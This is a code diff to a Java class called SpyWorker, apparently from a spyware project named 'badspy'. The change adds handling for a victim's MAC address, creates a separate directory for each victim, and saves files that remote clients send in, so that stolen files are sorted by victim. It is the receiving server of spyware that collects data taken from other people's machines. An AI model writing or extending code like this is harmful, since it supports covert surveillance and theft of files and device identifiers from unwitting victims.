@@ -1,5 +1,6 @@
 package com.blogspot.sontx.badspy.badserver.bo.worker;
 
+import com.blogspot.sontx.badspy.badserver.Config;
 import com.blogspot.sontx.badspy.badserver.bean.SpyDataHeader;
 import com.blogspot.sontx.badspy.badserver.bo.SpyReader;
 import com.blogspot.sontx.badspy.badserver.bo.SpyWriter;
@@ -18,6 +19,7 @@ public class SpyWorker extends Thread implements Closeable {
     private Socket socket;
     private SpyReader reader;
     private SpyWriter writer;
+    private File victimDir = null;
     private OnCompletedListener mOnCompletedListener = null;
 
     public void setOnCompletedListener(OnCompletedListener listener) {
@@ -49,12 +51,28 @@ public class SpyWorker extends Thread implements Closeable {
             case SpyDataHeader.HEADER_FILE:
                 receiveFile(header.getContentLength());
                 break;
+            case SpyDataHeader.HEADER_MAC:
+                receiveMAC(header.getContentLength());
+                break;
         }
     }
 
+    private void receiveMAC(int contentLength) throws IOException {
+        Log.i("Receiving MAC address...");
+        SpyMACReceiver receiver = new SpyMACReceiver(reader, writer, contentLength);
+        receiver.start();
+        Log.i(String.format("Received MAC address, victim ID is %s", receiver.getVictimDir()));
+        if (receiver.getVictimDir() != null)
+            this.victimDir = new File(Config.WORKING_DIR, receiver.getVictimDir());
+    }
+
     private void receiveFile(int contentLength) throws IOException {
+        if (victimDir == null || !victimDir.isDirectory()) {
+            Log.e("No victim directory exists!");
+            return;
+        }
         Log.i(String.format("Receiving file[%d bytes]...", contentLength));
-        SpyFileReceiver receiver = new SpyFileReceiver(reader, writer, contentLength, new File("C:\\Users\\xuans\\Desktop\\spy\\server"));
+        SpyFileReceiver receiver = new SpyFileReceiver(reader, writer, contentLength, victimDir);
         try {
             receiver.start();
             Log.i("Received file");
